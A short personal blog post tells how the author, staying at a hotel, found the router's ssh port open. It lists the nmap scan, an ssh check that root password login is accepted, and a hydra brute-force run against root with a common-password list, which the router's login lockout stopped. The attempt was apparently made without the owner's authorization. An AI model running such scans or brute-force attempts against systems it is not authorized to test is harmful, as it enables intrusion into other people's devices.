<!doctype html><html lang=en><head><meta charset=utf-8><meta content=no-referrer name=referrer><meta content="width=device-width,initial-scale=1.0,maximum-scale=5" name=viewport><title>Scan An Open ssh Port | Jiacheng's Mini Blog</title><meta content="Scan An Open ssh Port | Jiacheng's Mini Blog" property=og:title><meta content="Scan An Open ssh Port | Jiacheng's Mini Blog" name=twitter:title><meta content="I was living in a hotel in the quarantine time, which has a very bad network. While I was doing some network configuration checking, I accidentally found the ssh port of the router is open." name=description><meta content="I was living in a hotel in the quarantine time, which has a very bad network. While I was doing some network configuration checking, I accidentally found the ssh port of the router is open." property=og:description><meta content="I was living in a hotel in the quarantine time, which has a very bad network. While I was doing some network configuration checking, I accidentally found the ssh port of the router is open." name=twitter:description><meta content="Jiacheng's Mini Blog" property=og:site_name><meta content=https://jason0214.github.io property=og:url><link crossorigin href=https://fonts.gstatic.com rel=preconnect><link href=https://jason0214.github.io/base.css rel=stylesheet><link href=https://fonts.googleapis.com rel=preconnect><link crossorigin href=https://fonts.gstatic.com rel=preconnect><link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel=stylesheet><link href=https://jason0214.github.io/fontawesome/fontawesome.css rel=stylesheet><link href=https://jason0214.github.io/fontawesome/brands.css rel=stylesheet><link href=https://jason0214.github.io/fontawesome/solid.css rel=stylesheet><link href=https://jason0214.github.io/favicon.ico rel=icon type=image/x-icon><body><a class="skip-link p-screen-reader-text" href=#main>Skip to content</a><header class=l-header><h1 class="c-title p-title"><a class=p-title__link href=https://jason0214.github.io>Jiacheng's Mini Blog</a></h1><p class=p-subtitle>Less tech, more life</header><main class=l-main id=main><article class=p-article><header><h1>Scan An Open ssh Port</h1><div><div class=c-time><time datetime=" 2020-06-01"> 2020-06-01 </time> - (1 min read)</div></div></header><section class=p-article__body id=js-article><p>I was living in a hotel in the quarantine time, which has a very bad network. While I was doing some network configuration checking, I accidentally found the ssh port of the router is open.</p><span id=continue-reading></span><h2 id=scan-open-ports>Scan open ports<a aria-label="Anchor link for: scan-open-ports" class=zola-anchor href=#scan-open-ports><i class="fas fa-link"></i></a></h2><p>I was scanning the router for an open HTTP port where I found its ssh port opening.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>    </span><span style=color:#bf616a>nmap </span><span>$</span><span style=color:#bf616a>TARGET_IP
</span></code></pre><h2 id=check-ssh-authentication>Check ssh authentication<a aria-label="Anchor link for: check-ssh-authentication" class=zola-anchor href=#check-ssh-authentication><i class="fas fa-link"></i></a></h2><p>Further check if it accepts <code>root</code> remote connect and password authentications.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>ssh -v -n\
</span><span style=color:#bf616a>    -o</span><span> Batchmode=yes\
</span><span style=color:#bf616a>    -o</span><span> StrictHostKeyChecking=no\
</span><span style=color:#bf616a>    -o</span><span> UserKnownHostsFile=/dev/null\
</span><span>    root@$</span><span style=color:#bf616a>TARGET_IP </span><span style=color:#d08770>2</span><span>>&</span><span style=color:#d08770>1 </span><span>| </span><span style=color:#bf616a>grep</span><span> password
</span></code></pre><p>Turns out it does!<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>debug1:</span><span> Authentications that can continue: password
</span><span style=color:#bf616a>Permission</span><span> denied (password)</span><span style=color:#96b5b4>.
</span></code></pre><h2 id=try-brute-force-the-password>Try brute force the password<a aria-label="Anchor link for: try-brute-force-the-password" class=zola-anchor href=#try-brute-force-the-password><i class="fas fa-link"></i></a></h2><p>Use a <a href=https://github.com/danielmiessler/SecLists>dictionary</a><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>    </span><span style=color:#bf616a>hydra -l</span><span> root</span><span style=color:#bf616a> -P</span><span> top-20-common-SSH-passwords.txt $</span><span style=color:#bf616a>TARGET_IP -t</span><span> 4 ssh
</span></code></pre><h2 id=user-locked>User locked<a aria-label="Anchor link for: user-locked" class=zola-anchor href=#user-locked><i class="fas fa-link"></i></a></h2><p>After 10 tries, the <code>root</code> was locked. Looks like it is a Cisco router with <a href=https://www.cisco.com/en/US/docs/ios-xml/ios/sec_usr_aaa/configuration/15-2mt/sec-login-pw-retry.html#GUID-CA5A3F7D-E324-490E-B551-802924411091>Login Password Retry Lockout</a>. Had to admit it is secure to me :relieved:.<h2 id=reference>Reference<a aria-label="Anchor link for: reference" class=zola-anchor href=#reference><i class="fas fa-link"></i></a></h2><ul><li><a href=https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords>https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords</a></ul></section><footer><nav class="c-pagination p-pagination"><div class=c-pagination__ctrl><div class=c-pagination__newer></div><div class=c-pagination__older></div></div></nav></footer></article></main><footer class=l-footer><p class=p-copyright></footer>